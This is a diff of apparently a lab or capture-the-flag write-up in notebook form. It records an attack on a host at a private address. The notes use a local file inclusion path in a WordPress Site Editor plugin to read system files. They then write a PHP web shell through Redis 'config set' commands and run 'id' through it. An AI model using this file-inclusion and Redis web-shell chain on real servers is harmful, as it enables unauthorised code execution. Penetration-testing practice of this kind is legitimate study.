@@ -167,8 +167,18 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/systemd/system/redis.service" and found we can write to "/etc/redis" and "/opt/redis-files":
 
+![](Pasted%20image%2020221031163223.png)
 
+#### -Typed the following when logged into the redis server and navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php" and found the "id" command was successful:
 
+config set dir /opt/redis-files
+config set dbfilename test.php
+set test "<?php system('id'); ?>"
+
+![](Pasted%20image%2020221031163319.png)
+
+![](Pasted%20image%2020221031163356.png)
+#webshell
 
 
 
